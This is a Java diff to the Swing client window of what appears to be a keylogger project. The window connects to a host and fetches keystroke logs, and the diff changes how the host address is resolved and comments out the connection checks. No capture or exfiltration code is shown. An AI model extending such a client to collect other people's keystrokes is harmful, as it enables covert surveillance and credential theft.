@@ -4,10 +4,11 @@
 package com.hao.keylogger.views;
 
 import java.awt.Dimension;
-import java.awt.Insets;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.util.Date;
 
 import javax.swing.Box;
@@ -20,8 +21,8 @@ import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 import javax.swing.JTextField;
 
-import com.hao.keylogger.controllers.ClientLogController;
-import com.hao.keylogger.controllers.IClientView;
+import com.hao.keylogger.controllers.Client.ClientLogController;
+import com.hao.keylogger.controllers.Client.IClientView;
 
 import net.sourceforge.jdatepicker.impl.JDatePanelImpl;
 import net.sourceforge.jdatepicker.impl.JDatePickerImpl;
@@ -56,8 +57,8 @@ public class ClientView extends JFrame implements ActionListener, IClientView {
 //		}
 	}
 	@Override
-	public String getHost() {
-		return tf_host.getText();
+	public InetAddress getHostAddress() throws UnknownHostException {
+			return InetAddress.getByName(tf_host.getText());
 	}
 
 	@Override
@@ -182,19 +183,19 @@ public class ClientView extends JFrame implements ActionListener, IClientView {
 		
 		switch (btn.getName()) {
 		case BTN_CONNECT_NAME:
-			if (controller.connect()) {
-				isConnected = true;
-			}
+		//	if (controller.connect()) {
+			//	isConnected = true;
+			//}
 			break;
 		case BTN_FETCH_LOG_NAME:
-			if (isConnected) {
+			//if (isConnected) {
 				controller.fetchLog(getDatePicked());
-			}
+			//}
 			break;
 		case BTN_FETCH_ALL_LOG_NAME:
-			if (isConnected) {
+			//if (isConnected) {
 				controller.fetchAllLogs();
-			}
+			//}
 			break;
 		}
 	}
